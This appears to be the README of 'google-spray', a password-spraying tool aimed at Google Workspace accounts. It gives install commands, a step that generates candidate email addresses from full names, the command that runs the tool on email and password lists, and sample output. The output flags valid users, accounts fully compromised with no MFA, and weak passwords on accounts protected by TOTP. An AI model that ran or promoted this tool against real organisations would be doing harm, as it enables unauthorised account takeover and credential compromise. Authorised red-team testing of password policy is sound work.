# google-spray
Google Workspace Password Sprayer



**Usage:**



```bash
# pip3 install playwright
# playwright install chromium
# ./username-anarchy --suffix @<domain> <Full Name> >> emails.txt

$ python3 google-spray.py emails.txt passwords.txt

[*] Loaded 9 emails and 6 passwords. Starting browser engine...
[-] Invalid user: j.s***@sho**********.com
[-] Invalid user: js@sho**********.com
[+] VALID USER: jan**@sho**********.com
    [!] FULL COMPROMISE (no MFA): jan**@sho**********.com / W******
[-] Invalid user: jas**@sho**********.com
[-] Invalid user: jw@sho**********.com
[+] VALID USER: jas****@sho**********.com
    [!] FULL COMPROMISE (no MFA): jas****@sho**********.com / 8mc***********
[-] Invalid user: roh**@sho**********.com
[-] Invalid user: ra@sho**********.com
[+] VALID USER: roh****@sho**********.com
    [!] WEAK PASSWORD + MFA ACTIVE: roh****@sho**********.com / Gi**********!  [MFA type: TOTP]
```

